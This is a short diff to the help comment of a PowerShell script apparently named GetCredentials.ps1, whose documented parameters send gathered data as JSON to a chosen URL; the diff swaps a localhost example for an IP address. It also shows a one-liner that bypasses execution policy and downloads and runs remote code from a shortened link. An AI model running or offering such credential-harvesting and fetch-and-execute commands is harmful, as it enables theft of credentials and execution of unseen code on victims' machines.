@@ -14,14 +14,14 @@ Performs the following task
 .PARAMETERS
     -output
         Enter output path
-        Example: ./script.ps1 -output C:\windows\temp\out
+        Example: ./GetCredentials.ps1 -output C:\windows\temp\out
     -url
         Enter url where the data will be sent as a json request
-        Example: ./script.ps1 -url http://localhost/data
+        Example: ./GetCredentials.ps1 -url http://192.168.1.174/data
     
 .EXAMPLE 
 #Run script with parameters
-.\script.ps1 -output C:\windows\temp\out -url http://localhost/data
+.\GetCredentials.ps1 -output C:\windows\temp\out -url http://192.168.1.174/data
 #Run from github
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://bit.ly/2El9Fyw’)"
 #>
